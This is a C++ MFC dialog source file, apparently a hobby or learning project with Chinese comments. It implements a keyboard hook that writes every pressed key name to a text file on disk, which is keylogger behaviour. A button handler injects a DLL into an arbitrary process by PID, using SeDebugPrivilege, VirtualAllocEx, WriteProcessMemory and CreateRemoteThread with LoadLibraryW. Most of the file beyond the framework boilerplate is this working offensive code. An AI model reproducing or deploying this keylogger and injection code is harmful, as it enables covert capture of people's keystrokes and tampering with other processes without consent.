
#include "pch.h"
#include "framework.h"
#include "Hook_keybord.h"
#include "Hook_keybordDlg.h"
#include "afxdialogex.h"
#include <string>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()
CHookkeybordDlg::CHookkeybordDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_HOOK_KEYBORD_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CHookkeybordDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_BUTTON1, text_1);
	//DDX_Control(pDX, IDC_COMBO1, m_s);
	DDX_Control(pDX, IDC_EDIT100, ed1);
}

BEGIN_MESSAGE_MAP(CHookkeybordDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CHookkeybordDlg::OnClickedButton1)
	ON_CBN_SELCHANGE(IDC_COMBO1, &CHookkeybordDlg::OnCbnSelchangeCombo1)
END_MESSAGE_MAP()


// CHookkeybordDlg 消息处理程序

BOOL CHookkeybordDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CHookkeybordDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CHookkeybordDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CHookkeybordDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

// 需要定义函数指针
typedef BOOL(*PADD)(void);
/// <summary>
/// 注册全局钩子
/// </summary>
HHOOK hHook;
TCHAR szOld[8192];
CComboBox* p;
LRESULT CALLBACK MyKeyboardProc(_In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam)
{
	if (code < 0 || code == HC_NOREMOVE) {
		// 如果代码小于零，则挂钩过程必须将消息传递给CallNextHookEx函数，而无需进一步处理，并且应返回CallNextHookEx返回的值。此参数可以是下列值之一。(来自官网手册)
		return CallNextHookEx(hHook, code, wParam, lParam);
	}
	if (lParam & 0x40000000) {
		// 【第30位的含义】键状态。如果在发送消息之前按下了键，则值为1。如果键被释放，则为0。(来自官网手册)
		// 我们只考虑被按下后松开的状态
		return CallNextHookEx(hHook, code, wParam, lParam);
	}
	char szKeyName[200];
	// 【参数1】LPARAM类型，代表键状态
	// 【参数2】缓冲区
	// 【参数3】缓冲区大小
	GetKeyNameText(lParam, (LPWSTR)szKeyName, 100);
	// 打开文件
	FILE* fp;
	errno_t err = fopen_s(&fp, "D:\\Hook_Keyboed.txt", "a+");
	if (err != 0) {
		// 文件打开失败，让钩子继续往下传
		return CallNextHookEx(hHook, code, wParam, lParam);
	}
	// 写入文件
	char szWriteText[100];
	// 改写字符串
	sprintf_s(szWriteText, "%s\n", szKeyName);
	fwrite(szWriteText, 1, strlen(szWriteText), fp);
	// 关闭文件
	fclose(fp);
	// 将钩子往下传
	return CallNextHookEx(hHook, code, wParam, lParam);
}
void CHookkeybordDlg::OnClickedButton1()
{
	// m_StrDLLPath 为DLL文件的绝对路径，例如CString m_StrDLLPath(L"D:\\桌面\\testDLL.DLL")
	CString m_StrDLLPath(L"C:\\Users\\黄首旗\\source\\repos\\Hook_keybord\\x64\\Debug\\MFCLibrary1.dll");
	if (m_StrDLLPath.IsEmpty()) {
		MessageBox(_T("请选择DLL模块"));
		return;
	}
	//// :: 代表全局查找，后面的内容可以通过SPY++获取
	//// 【参数1】类
	//// 【参数2】标题
	//HWND hwnd = ::FindWindow(L"Intermediate D3D Window", L"5C000000");
	//if (hwnd == NULL) {
	//	MessageBox(L"没有找到");
	//	return;
	//}
	// 获取窗口所在的PID
	CString text;
	ed1.GetWindowTextW(text);
	std::string text_string = CT2A(text.GetBuffer());
	int text_int = atoi(text_string.c_str());
	DWORD dwPID = text_int;
	//GetWindowThreadProcessId(hwnd, &dwPID);
	if (dwPID == 0) {
		MessageBox(L"获取PID失败");
		return;
	}
	// 通过PID获取进程的句柄
	// 获取句柄后，可以完全控制进程
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (hProcess == NULL) {
		MessageBox(L"进程的句柄获取失败");
		return;
	}
	// TerminateProcess(hProcess, 0);//关闭句柄对象
	// 实现注入
	// 1.首先要提升权限，打开进程的访问令牌
	// 【参数1】当前程序
	// 【参数2】权限，可添加的权限|可查询的权限
	HANDLE hToken;
	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		// 权限修改失败
		MessageBox(L"权限修改失败");
		return;
	}
	//2.查看与进程相关的特权信息
	LUID luid;
	if (FALSE == LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
		// 特权信息查询失败
		MessageBox(L"特权信息查询失败");
		return;
	};
	//3.调节进程的访问令牌的特权属性
	// 这几行代码固定不变
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // 打开特权
	// 【参数1】访问令牌
	// 【参数2】是否禁用特权
	// 【参数3】新特权所占的字节数
	// 【参数4】原来的特权是否需要保存
	// 【参数5】原特权的长度
	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		// 提升特权失败
		MessageBox(L"提升特权失败");
		return;
	};

	//在远程进程中申请内存空间
	// 【参数1】程序的句柄对象
	// 【参数2】申请的内存地址，由系统分配，所以为NULL
	// 【参数3】申请的内存长度
	// 【参数4】调用物理存储器
	// 【参数5】这块内存可读可写，可执行
	// 【返回】申请到的地址
	LPVOID lpAddr = VirtualAllocEx(hProcess, NULL, m_StrDLLPath.GetLength() * 2 + 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpAddr == NULL) {
		// 在远程进程中申请内存失败
		MessageBox(L"在远程进程中申请内存失败");
		return;
	}
	// 把DLL路径写入到远程进程中
	// 强行修改程序的内存
	// 【参数1】程序的句柄
	// 【参数2】申请到的内存首地址
	// 【参数3】写入的内容
	// 【参数4】要写入的字节数
	// 【参数5】
	if (FALSE == WriteProcessMemory(hProcess, lpAddr, m_StrDLLPath, m_StrDLLPath.GetLength() * 2, NULL)) {
		// 在远程进程中写入数据失败
		MessageBox(L"在远程进程中写入数据失败");
		return;
	};


	// 调用Kernel32.dll中的LoadLibraryW方法用以加载DLL文件
	PTHREAD_START_ROUTINE pfnStartAssr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");

	// 在远程进程中开辟线程
	// 【参数1】远程线程的句柄
	// 【参数2】线程属性。NULL表示使用默认属性
	// 【参数3】堆栈大小。0代表默认
	// 【参数4】加载DLL文件的对象
	// 【参数5】加载文件的路径
	// 【参数6】延迟时间。0代表立即启动
	// 【参数7】线程ID。为NULL就行了
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnStartAssr, lpAddr, 0, NULL);
	if (hThread == NULL) {
		// 创建远程线程失败
		MessageBox(L"创建远程线程失败");
		return;
	}
	MessageBox(L"注入成功");
	// 加载DLL库
	HMODULE hDLL = LoadLibrary(L"MFCLibrary1.dll");
	if (hDLL == NULL) {
		MessageBox(L"加载失败");
		return;
	}
	// 获取库中的方法
	PADD pAdd = (PADD)GetProcAddress(hDLL, "InstallHook");  // 获取函数
	// 使用库中的方法
	pAdd(); 
	// TODO: 在此添加控件通知处理程序代码
}
void CHookkeybordDlg::OnCbnSelchangeCombo1()
{

	// TODO: 在此添加控件通知处理程序代码
}

